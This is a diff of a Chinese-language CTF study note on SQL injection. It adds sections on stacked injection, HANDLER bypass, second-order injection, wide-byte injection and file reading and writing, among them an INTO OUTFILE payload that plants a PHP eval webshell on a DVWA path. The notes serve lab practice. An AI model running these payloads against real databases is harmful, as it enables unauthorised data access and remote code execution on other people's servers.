@@ -139,7 +139,9 @@ from→frorom
 
 
 
-# 输入数字有回显,输入字符无回显
+# 各种例外和技巧
+
+## 输入数字有回显,输入字符无回显
 
 参考buuctf-suctf 2019 easysql1
 
@@ -153,7 +155,9 @@ from→frorom
 
 
 
-# 6在很多字符被屏蔽的情况下可以考虑堆叠注入
+## 堆叠注入
+
+在很多字符被屏蔽的情况下，尤其是select被屏蔽可以考虑
 
 闭合原语句;sql注入语句 -- a
 
@@ -163,13 +167,13 @@ from→frorom
 
 ​        ;show columns from 表名 -- a
 
-# 在知道表名的情况下可以用handler绕过
+## 在知道表名的情况下可以用handler绕过
 
 ;handler 表名 open as p;handler p read first – a
 
 
 
-# 异或注入
+## 异或注入
 
 例题:<font color='orange'>buuctf-hackworld</font>
 
@@ -185,7 +189,7 @@ from→frorom
 
 
 
-# get型利用updatexml和extractvalue函数报错注入
+## get型利用updatexml和extractvalue函数报错注入
 
 原理:https://zhuanlan.zhihu.com/p/398726175
 
@@ -197,7 +201,37 @@ extractvalue同理
 
 
 
-# load_file()函数读文件
+## floor函数报错注入
+
+待学习
+
+
+
+## 二次注入
+
+例如重置密码场景，如sql语句：update passwd=$pass where username=uname
+
+假如我先注册一个用户名，叫admin#
+
+那么我再去修改密码就变成了update passwd=$pass where username=admin#
+
+这样就变成了给admin账户修改密码了
+
+
+
+## 宽字节注入
+
+只适用于gbk编码的数据库情况
+
+判断方法:有吃字符现象
+
+待学习
+
+
+
+# 利用sql注入读取和写入文件
+
+## load_file()函数读文件
 
 **buuctf:fakebook**有一种方法就是这样
 
@@ -215,7 +249,17 @@ MySQL的load_file()函数可以进行文件读取，**但是load_file()函数读
 
 
 
+## 利用into outfile写文件
 
+将sql语句查询结果写入指定路径的文件，需要数据库在指定路径有写入权限，且得知道目录，否则只能试
+
+例：1' and 1=2 union select user,password from users into outfile '/var/www/dvwaplus/1.bak'#
+
+### 配合一句话木马
+
+```
+1' and 1=2 union select 1,'<?php @eval($_POST[123])?>' into outfile '/var/www/dvwaplus/tq.php'#
+```
 
 
 
